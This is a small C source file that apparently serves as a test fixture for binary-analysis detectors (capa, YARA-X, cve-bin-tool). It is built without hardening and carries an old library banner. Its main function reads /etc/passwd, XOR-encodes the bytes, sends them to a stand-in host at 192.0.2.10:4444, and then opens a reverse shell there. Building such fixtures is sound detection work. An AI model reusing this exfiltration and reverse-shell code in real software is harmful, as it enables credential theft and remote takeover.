/* PATHOS worker-binary test program: a tiny ELF with a few capabilities
 * (TCP socket, process execution, file read, XOR encoding) and an embedded
 * version string of an old library, for the capa, YARA-X and cve-bin-tool
 * fixtures. Never run by the tests. Build (no hardening flags, so the
 * binary-hardening checks report it too):
 *   gcc -O0 -fno-stack-protector -no-pie -z norelro -o sample sample.c */
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

const char *banner = "libcurl/7.29.0 OpenSSL/1.0.1e zlib/1.2.7";

static void xor_buf(char *b, size_t n, char k) {
    for (size_t i = 0; i < n; i++) b[i] ^= k;
}

int main(int argc, char **argv) {
    char buf[256];
    FILE *f = fopen("/etc/passwd", "r");
    if (f) { fread(buf, 1, sizeof buf, f); fclose(f); }
    xor_buf(buf, sizeof buf, 0x5a);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    inet_pton(AF_INET, "192.0.2.10", &a.sin_addr);
    if (connect(s, (struct sockaddr *)&a, sizeof a) == 0) {
        send(s, buf, sizeof buf, 0);
        dup2(s, 0); dup2(s, 1);
        execl("/bin/sh", "sh", (char *)0);
    }
    printf("%s %d\n", banner, argc > 1 ? atoi(argv[1]) : 0);
    return 0;
}
